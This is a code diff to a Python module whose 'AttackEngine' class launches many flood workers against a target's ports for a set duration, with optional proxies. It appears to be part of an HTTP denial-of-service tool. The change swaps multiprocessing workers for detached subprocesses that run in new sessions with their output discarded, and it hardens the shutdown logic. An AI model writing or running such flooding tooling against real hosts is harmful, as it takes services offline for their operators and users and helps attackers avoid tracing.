@@ -1,9 +1,11 @@
 import asyncio
 import json as _json
-import multiprocessing
 import os
+import signal
+import subprocess
 import random
 import string
+import sys
 import time
 from typing import Optional
 from urllib.parse import urlparse
@@ -72,6 +74,7 @@ def _full_url(base):
 
 
 NUM_WORKERS = max((os.cpu_count() or 2) - 1, 2)
+_WORKER_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flood_worker.py")
 
 
 class AttackEngine:
@@ -87,22 +90,28 @@ class AttackEngine:
         return self._task is not None and not self._task.done()
 
     def _spawn_workers(self, target, ports):
-        from flood_worker import run_worker
+        python = sys.executable
         for port in ports:
             base = _url(target, port)
             for _ in range(NUM_WORKERS):
-                p = multiprocessing.Process(target=run_worker, args=(base, 500), daemon=True)
-                p.start()
+                p = subprocess.Popen(
+                    [python, _WORKER_SCRIPT, base, "500"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    start_new_session=True)
                 self._workers.append(p)
 
     def _kill_workers(self):
         for p in self._workers:
-            if p.is_alive():
+            try:
                 p.terminate()
+            except OSError:
+                pass
+        time.sleep(0.5)
         for p in self._workers:
-            p.join(timeout=2)
-            if p.is_alive():
+            try:
                 p.kill()
+            except OSError:
+                pass
         self._workers.clear()
 
     async def start(self, target, ports, method, threads, duration, use_proxies):
